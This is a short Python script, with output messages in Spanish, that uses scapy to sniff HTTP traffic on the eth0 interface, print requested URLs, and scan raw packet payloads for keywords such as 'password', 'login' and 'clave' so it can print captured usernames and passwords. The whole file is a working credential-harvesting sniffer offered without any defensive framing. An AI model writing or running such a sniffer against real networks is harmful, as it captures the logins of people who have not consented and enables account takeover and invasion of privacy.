#!/bin/usr/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_date(packet):
    return  packet[http.HTTPRequest].If_Modified_Since

def getUserPass(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords=["usermane","id","email","user","login","password","pass","usuario","clave","uname","com&pass"]
        for key in keywords:
            if key in load:
                return (load)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        modified = get_date(packet)
        url=get_url(packet)
        userPass=getUserPass(packet)
        print("La última modificación fue: "+str(modified))
        print("[+] La URL es esta -->"+ url.decode())
        if userPass:
            print("\n\n [+] Posible Usuario & Contraseña:"+ str(userPass))

sniff("eth0")